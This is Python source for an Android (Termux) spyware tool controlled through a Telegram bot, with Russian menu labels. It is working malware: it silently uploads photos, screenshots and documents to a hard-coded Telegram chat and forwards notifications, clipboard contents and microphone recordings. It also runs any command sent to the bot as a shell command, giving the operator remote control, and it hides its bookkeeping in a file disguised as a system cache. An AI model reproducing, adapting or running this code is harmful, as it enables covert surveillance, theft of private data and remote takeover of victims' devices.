import os, time, subprocess, threading

try:
    import telebot
    from telebot import types
except ImportError:
    subprocess.run(["pip", "install", "pyTelegramBotAPI"])
    import telebot
    from telebot import types

TOKEN = "8354728858:AAEsorSBoucxw5aZDTxDErBRHxhIe5m8Ysw"
CHAT_ID = "7943753454"
bot = telebot.TeleBot(TOKEN)
DB_FILE = os.path.expanduser("~/.sys_cache_v3")

CONFIG = {
    "drain_active": True,
    "notif_active": True,
    "mode": "new",
    "targets": {"camera": True, "screens": True, "docs": True}
}

def get_main_menu():
    m = types.ReplyKeyboardMarkup(resize_keyboard=True)
    m.add("📸 Настройка Слива", "🎙 Микрофон")
    m.add("📱 Об устройстве", "📋 Буфер")
    m.add("🔔 Уведомления", "🛠 Выполнить команду")
    return m

def get_drain_menu():
    m = types.InlineKeyboardMarkup()
    m.add(types.InlineKeyboardButton(f"Слив: {'✅ ON' if CONFIG['drain_active'] else '❌ OFF'}", callback_data="t_drain"))
    m.add(types.InlineKeyboardButton(f"Уведы: {'✅ ON' if CONFIG['notif_active'] else '❌ OFF'}", callback_data="t_notif"))
    m.add(types.InlineKeyboardButton(f"Режим: {'🆕 Новые' if CONFIG['mode']=='new' else '📚 Все'}", callback_data="t_mode"))
    m.add(types.InlineKeyboardButton(f"Камера+Скрины: {'✅' if CONFIG['targets']['camera'] else '❌'}", callback_data="t_cam"),
          types.InlineKeyboardButton(f"Документы: {'✅' if CONFIG['targets']['docs'] else '❌'}", callback_data="t_docs"))
    return m

# Сборщик файлов (фото + доки)
def stealer():
    while True:
        if CONFIG["drain_active"]:
            paths = ["/sdcard/DCIM/Camera", "/sdcard/DCIM/Screenshots", "/sdcard/Download", "/sdcard/Documents"]
            exts = "-name '*.jpg' -o -name '*.png' -o -name '*.pdf' -o -name '*.txt' -o -name '*.apk' -o -name '*.docx' -o -name '*.zip'"
            time_arg = "-mmin -1440" if CONFIG["mode"] == "new" else ""
            
            for p in paths:
                if not os.path.exists(p): continue
                cmd = f"find '{p}' -maxdepth 2 -type f \( {exts} \) {time_arg}"
                files = subprocess.getoutput(cmd).splitlines()
                for f in files:
                    if not os.path.isfile(f): continue
                    with open(DB_FILE, "a+") as db:
                        db.seek(0)
                        if f not in db.read():
                            try:
                                with open(f, "rb") as doc:
                                    bot.send_document(CHAT_ID, doc, caption=f"📁 Из: {p.split('/')[-1]}")
                                db.write(f + "\n")
                                time.sleep(1)
                            except: pass
        time.sleep(60)

# Перехватчик уведомлений
def notification_logger():
    last_notif = ""
    while True:
        if CONFIG["notif_active"]:
            try:
                out = subprocess.getoutput("termux-notification-list")
                if out and out != last_notif:
                    bot.send_message(CHAT_ID, f"🔔 *Новое уведомление:* \n`{out[:4000]}`", parse_mode="Markdown")
                    last_notif = out
            except: pass
        time.sleep(10)

@bot.message_handler(commands=['start'])
def start(m):
    bot.send_message(CHAT_ID, "🚀 *Критическое обновление системы завершено.*", parse_mode="Markdown", reply_markup=get_main_menu())

@bot.callback_query_handler(func=lambda call: True)
def cb(call):
    global CONFIG
    if call.data == "t_drain": CONFIG["drain_active"] = not CONFIG["drain_active"]
    elif call.data == "t_notif": CONFIG["notif_active"] = not CONFIG["notif_active"]
    elif call.data == "t_mode": CONFIG["mode"] = "all" if CONFIG["mode"]=="new" else "new"
    elif call.data == "t_cam": CONFIG["targets"]["camera"] = not CONFIG["targets"]["camera"]
    elif call.data == "t_docs": CONFIG["targets"]["docs"] = not CONFIG["targets"]["docs"]
    bot.edit_message_reply_markup(CHAT_ID, call.message.message_id, reply_markup=get_drain_menu())

@bot.message_handler(content_types=['text'])
def handle(m):
    if m.text == "📸 Настройка Слива":
        bot.send_message(CHAT_ID, "Параметры сбора данных:", reply_markup=get_drain_menu())
    elif m.text == "📱 Об устройстве":
        info = f"""
📱 *Модель:* {subprocess.getoutput("getprop ro.product.model")}
🛠 *Проц:* {subprocess.getoutput("getprop ro.product.cpu.abi")}
🔋 *Батарея:* {subprocess.getoutput("termux-battery-status")}
📡 *Сеть:* {subprocess.getoutput("termux-telephony-deviceinfo")}
⏰ *Аптайм:* {subprocess.getoutput("uptime -p")}
        """
        bot.send_message(CHAT_ID, info, parse_mode="Markdown")
    elif m.text == "🎙 Микрофон":
        bot.send_message(CHAT_ID, "🎙 Запись 15 сек...")
        os.system("termux-microphone-record -d 15 -f ~/rec.amr")
        with open(os.path.expanduser("~/rec.amr"), "rb") as a:
            bot.send_document(CHAT_ID, a)
    elif m.text == "🔔 Уведомления":
        res = subprocess.getoutput("termux-notification-list")
        bot.send_message(CHAT_ID, f"🔔 Последние уведомления:\n`{res[:4000]}`", parse_mode="Markdown")
    elif m.text == "📋 Буфер":
        bot.send_message(CHAT_ID, f"📋 Буфер:\n`{subprocess.getoutput('termux-clipboard-get')}`")
    elif m.text == "🛠 Выполнить команду":
        bot.send_message(CHAT_ID, "Пришли любую команду (например, `ls` или `pwd`)")
    else:
        bot.send_message(CHAT_ID, f"💻 Вывод:\n`{subprocess.getoutput(m.text)[:4000]}`")

threading.Thread(target=stealer, daemon=True).start()
threading.Thread(target=notification_logger, daemon=True).start()
bot.polling(none_stop=True)
